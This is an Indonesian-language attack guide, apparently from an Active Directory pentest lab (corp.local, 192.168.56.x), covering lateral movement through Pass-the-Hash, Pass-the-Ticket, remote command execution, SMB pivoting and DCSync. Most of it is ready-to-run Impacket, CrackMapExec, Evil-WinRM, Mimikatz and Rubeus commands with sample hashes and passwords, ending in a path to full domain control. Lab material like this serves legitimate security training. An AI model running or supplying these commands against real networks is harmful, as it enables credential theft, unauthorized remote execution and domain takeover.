# ↔️ Skenario Serangan: Lateral Movement

## Gambaran Umum

Lateral movement adalah teknik berpindah dari satu mesin ke mesin lain di dalam jaringan menggunakan credential yang sudah didapatkan. Tujuannya adalah menjangkau mesin yang memiliki data atau akses yang lebih berharga, hingga akhirnya mencapai Domain Controller.

---

## Skenario 1: Pass-the-Hash (PtH)

**Tujuan:** Menggunakan NTLM hash (bukan password plaintext) untuk mengautentikasi ke mesin lain.

**MITRE ATT&CK:** T1550.002 — Use Alternate Authentication Material: Pass the Hash

**Penjelasan:** Dalam autentikasi NTLM, Windows tidak mengirim password — yang dikirim adalah **hash** dari password. Jika attacker mendapatkan hash (dari credential dumping), mereka bisa langsung menggunakannya untuk login tanpa perlu tahu password aslinya. Ini bekerja karena server hanya memvalidasi hash, bukan password.

**Prasyarat:** NTLM hash dari user yang memiliki akses admin di mesin target.

```bash
# Asumsikan kita sudah mendapat NTLM hash s.admin dari credential dump
# Contoh hash: aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42

# Pass-the-Hash menggunakan Impacket psexec
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 \
    corp.local/s.admin@192.168.56.10

# Pass-the-Hash menggunakan Impacket wmiexec (lebih stealth)
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 \
    corp.local/s.admin@192.168.56.10

# Pass-the-Hash menggunakan Impacket smbexec
impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 \
    corp.local/s.admin@192.168.56.10

# Pass-the-Hash menggunakan CrackMapExec (cek akses di banyak mesin sekaligus)
crackmapexec smb 192.168.56.10 192.168.56.11 192.168.56.20 192.168.56.30 \
    -u "s.admin" -H "e19ccf75ee54e06b06a5907af13cef42"

# Pass-the-Hash menggunakan Evil-WinRM
evil-winrm -i 192.168.56.10 -u s.admin -H "e19ccf75ee54e06b06a5907af13cef42"
```

### Perbedaan Tool Eksekusi Remote

| Tool | Protokol | Stealth Level | Catatan |
|------|----------|---------------|---------|
| psexec | SMB (445) | Rendah | Membuat service, meninggalkan artifact |
| wmiexec | WMI (135) | Sedang | Tidak membuat service, lebih bersih |
| smbexec | SMB (445) | Sedang | Mirip psexec tapi via share |
| evil-winrm | WinRM (5985) | Sedang | Shell interaktif, fitur upload/download |
| atexec | Task Scheduler | Sedang | Menggunakan scheduled task |

---

## Skenario 2: Pass-the-Ticket (PtT)

**Tujuan:** Menggunakan Kerberos ticket yang dicuri untuk mengautentikasi ke service lain.

**MITRE ATT&CK:** T1550.003 — Use Alternate Authentication Material: Pass the Ticket

**Penjelasan:** Berbeda dari PtH yang menggunakan NTLM hash, PtT menggunakan **Kerberos ticket** (TGT atau TGS). Jika attacker mendapat TGT user, mereka bisa meminta TGS untuk service apa pun sebagai user tersebut — termasuk service di DC.

**Prasyarat:** Akses ke mesin dimana target user sedang login (untuk extract ticket).

### Dari Target Windows (menggunakan Mimikatz)

```powershell
# Export semua Kerberos ticket dari memori
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Lihat file .kirbi yang diexport
dir *.kirbi

# Inject ticket ke session saat ini
mimikatz.exe "kerberos::ptt [0;12345]-2-0-40e10000-s.admin@krbtgt-CORP.LOCAL.kirbi" "exit"

# Verifikasi ticket sudah ter-inject
klist

# Sekarang bisa akses resource sebagai s.admin
dir \\dc1.corp.local\C$
```

### Dari Target Windows (menggunakan Rubeus)

```powershell
# Dump semua ticket
.\Rubeus.exe dump

# Dump TGT spesifik
.\Rubeus.exe dump /user:s.admin

# Inject ticket (base64)
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Request TGT baru menggunakan hash (overpass-the-hash)
.\Rubeus.exe asktgt /user:s.admin /rc4:<ntlm_hash> /ptt
```

### Dari Kali (menggunakan Impacket)

```bash
# Convert .kirbi ke .ccache (format yang digunakan Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set environment variable untuk menggunakan ticket
export KRB5CCNAME=ticket.ccache

# Gunakan ticket untuk akses
impacket-psexec -k -no-pass corp.local/s.admin@dc1.corp.local
impacket-wmiexec -k -no-pass corp.local/s.admin@dc1.corp.local
impacket-smbclient -k -no-pass corp.local/s.admin@dc1.corp.local
```

---

## Skenario 3: Remote Command Execution

**Tujuan:** Menjalankan perintah di mesin remote menggunakan credential yang sudah didapat.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares, T1021.006 — Remote Services: Windows Remote Management

```bash
# ---- Menggunakan CrackMapExec ----

# Eksekusi perintah tunggal di DC1
crackmapexec smb 192.168.56.10 -u "s.admin" -p "P@ssw0rd123" -x "whoami && hostname"

# Eksekusi PowerShell
crackmapexec smb 192.168.56.10 -u "s.admin" -p "P@ssw0rd123" -X "Get-ADUser -Filter *"

# Eksekusi di banyak mesin sekaligus
crackmapexec smb 192.168.56.10 192.168.56.20 192.168.56.30 \
    -u "s.admin" -p "P@ssw0rd123" -x "ipconfig"

# ---- Menggunakan Evil-WinRM ----

# Akses shell interaktif
evil-winrm -i 192.168.56.10 -u s.admin -p "P@ssw0rd123"

# Di dalam Evil-WinRM shell:
# upload file
# upload /home/kali/tools/SharpHound.exe C:\temp\SharpHound.exe
# download file
# download C:\temp\results.zip /home/kali/loot/results.zip
# execute .NET assembly
# Invoke-Binary /home/kali/tools/Rubeus.exe dump

# ---- Menggunakan Impacket ----

# Shell interaktif via WMI
impacket-wmiexec corp.local/s.admin:P@ssw0rd123@192.168.56.10

# Shell via PsExec
impacket-psexec corp.local/s.admin:P@ssw0rd123@192.168.56.10

# Shell via DCOM
impacket-dcomexec corp.local/s.admin:P@ssw0rd123@192.168.56.10

# Eksekusi via Scheduled Task
impacket-atexec corp.local/s.admin:P@ssw0rd123@192.168.56.10 "whoami"
```

---

## Skenario 4: SMB Pivoting

**Tujuan:** Menggunakan mesin yang sudah dikompromikan sebagai pivot point untuk mengakses mesin lain yang tidak bisa dijangkau langsung.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares

**Penjelasan:** Di lab ini semua mesin bisa dijangkau langsung dari Kali. Namun di dunia nyata, sering ada segmentasi jaringan. Pivoting memungkinkan attacker "melompat" dari satu jaringan ke jaringan lain melalui mesin yang sudah dikompromikan.

```bash
# Dari mesin yang sudah dikompromikan, enumerasi share di mesin lain
# (simulasi jika Kali tidak bisa langsung akses target)

# Akses FILESRV dari DC1 menggunakan credential s.admin
impacket-smbclient corp.local/s.admin:P@ssw0rd123@192.168.56.20

# Di dalam smbclient:
# shares            → list shares
# use IT            → connect ke share IT
# ls                → list files
# get deploy_script.bat  → download file
```

---

## Skenario 5: DCSync Attack

**Tujuan:** Menyimulasikan Domain Controller replication untuk mendapatkan semua password hash di domain.

**MITRE ATT&CK:** T1003.006 — OS Credential Dumping: DCSync

**Penjelasan:** DCSync memanfaatkan protokol replikasi Active Directory (MS-DRSR). Ketika attacker memiliki akun dengan hak replikasi (biasanya Domain Admin), mereka bisa "berpura-pura" menjadi DC dan meminta hash password dari semua user — termasuk `krbtgt` yang memungkinkan pembuatan Golden Ticket.

**Prasyarat:** Akun dengan Replicating Directory Changes dan Replicating Directory Changes All permission (biasanya Domain Admin).

```bash
# DCSync untuk mendapatkan hash semua user
impacket-secretsdump corp.local/s.admin:P@ssw0rd123@192.168.56.10

# DCSync untuk user spesifik
impacket-secretsdump corp.local/s.admin:P@ssw0rd123@192.168.56.10 -just-dc-user krbtgt

# DCSync untuk semua user (hanya NTLM hash)
impacket-secretsdump corp.local/s.admin:P@ssw0rd123@192.168.56.10 -just-dc-ntlm

# Menggunakan Mimikatz (dari mesin Windows)
# mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
# mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"
```

**Hasil yang diharapkan:** Hash krbtgt, Administrator, dan semua user di domain berhasil diekstrak.

---

## Ringkasan Lateral Movement Path

```
KALI (192.168.56.40)
│
├──[Password Spray]──► j.doe@CLIENT01
│                        │
│                        ├──[SMB Enum]──► FILESRV shares
│                        │                 │
│                        │                 └── credentials found
│                        │
│                        └──[Kerberoast]──► svc_backup hash cracked
│
├──[PtH/Evil-WinRM]──► helpdesk@CLIENT01
│                        │
│                        ├──[Credential Dump]──► s.admin hash
│                        │
│                        └──[Server Ops]──► DC1 (service creation)
│
├──[PtH/PtT]──► s.admin@DC1 (DOMAIN ADMIN)
│                 │
│                 └──[DCSync]──► ALL domain hashes
│
└──[PtH]──► s.admin@DC2 (full domain control)
```
